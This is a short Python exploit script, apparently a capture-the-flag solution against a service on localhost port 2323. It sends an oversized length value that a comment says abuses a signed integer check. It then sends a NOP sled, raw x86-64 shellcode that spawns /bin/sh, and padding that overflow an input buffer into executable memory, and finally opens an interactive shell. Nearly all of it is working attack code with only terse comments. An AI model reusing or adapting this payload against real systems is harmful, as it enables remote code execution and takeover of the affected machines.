import sys
sys.path.append("/home/blankwall/Template")

from isis import *
pattern = file("/home/blankwall/Template/pattern").read()
debug = True
host = "localhost"
port = 2323

def connect():
	s = get_socket((host,port))
	s.settimeout(0x10000000)
	return s

s = connect()
if debug:
	raw_input("?")

#integer overflow checks against eax signed check but should be unsigned
# skip sha1 code :)
s.send(lei64(2147484850))

raw_input("SEND")


shell ="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05\n"

#overflow input buffer flow into code buffer execute nops then shellcode

payload = "\x90" * 16500
payload += shell
payload += "\x90" * (0x4b20-len(payload))
s.send(payload)

telnet_shell(s)
